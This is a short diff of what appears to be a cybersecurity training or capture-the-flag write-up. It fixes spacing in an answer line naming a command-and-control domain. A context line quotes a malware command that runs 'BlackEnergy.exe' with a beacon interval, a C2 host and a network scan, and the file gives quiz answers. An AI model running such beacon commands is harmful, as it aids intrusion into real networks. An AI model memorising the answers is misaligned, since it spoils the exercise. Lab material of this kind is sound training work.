@@ -195,7 +195,7 @@ BlackEnergy.exe --beacon-interval 10 --c2 chicagogridupdates.com --scan 192.168.
 ```
 <br>
 
-**Answer: chicagogridupdates.com **<br><br>
+**Answer: chicagogridupdates.com**<br><br>
 
 **Q22. To find out why, enter Unmask the Phish.**<br><br>
 
